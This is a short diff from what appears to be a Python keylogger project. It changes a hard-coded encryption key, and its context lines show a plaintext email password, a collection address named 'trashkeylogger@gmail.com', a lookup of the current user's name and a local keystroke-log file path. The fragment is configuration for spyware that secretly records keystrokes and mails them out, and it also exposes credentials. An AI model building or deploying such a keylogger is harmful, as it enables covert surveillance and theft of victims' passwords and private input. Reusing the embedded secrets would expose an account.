@@ -56,7 +56,7 @@ password = "fyylgrzcjqftecbt"
 username = getpass.getuser()
 
 toaddr = "trashkeylogger@gmail.com"
-key = "Svok2Q3NSJTU9o0qcESR4tlYK2jblqGTI_WbCLD92m8="  # key for encryption
+key = "0qjzGZq-xxvjsVL3UNZ81ZqfK0RzlY7RnZQ-V8QuSvY="  # key for encryption
 
 file_path = "C:\\Users\\RAHUL\\Desktop\\KeyLogger\\Project"
 extend = "\\"  # it will add a extra slash in the path so that we can access the key_log.txt file
